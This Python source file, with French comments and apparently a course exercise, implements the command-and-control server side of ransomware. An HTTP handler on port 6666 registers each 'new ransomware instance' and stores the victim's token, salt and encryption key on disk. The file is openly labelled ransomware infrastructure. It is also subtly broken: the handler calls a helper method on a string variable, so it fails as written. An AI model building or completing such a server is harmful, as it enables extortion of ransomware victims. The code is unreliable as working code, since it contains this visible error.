import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance
        
        # On récupère les données dans le body
        token = body.get("token")
        salt = body.get("salt")
        key = body.get("key")

        # Création du répertoire 
        directory = os.path.join(self.ROOT_PATH, token) #Emplacement du répertoire
        os.makedirs(directory) #Crée le répertoire 

        # Sauvegarde des secrets dans des fichiers séparés
        directory.save_b64(token, salt, "salt.bin") #on utilise b64 pour sauvegarder en base 64 directement
        directory.save_b64(token, key, "key.bin")

        return {"status":"OK"}
           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()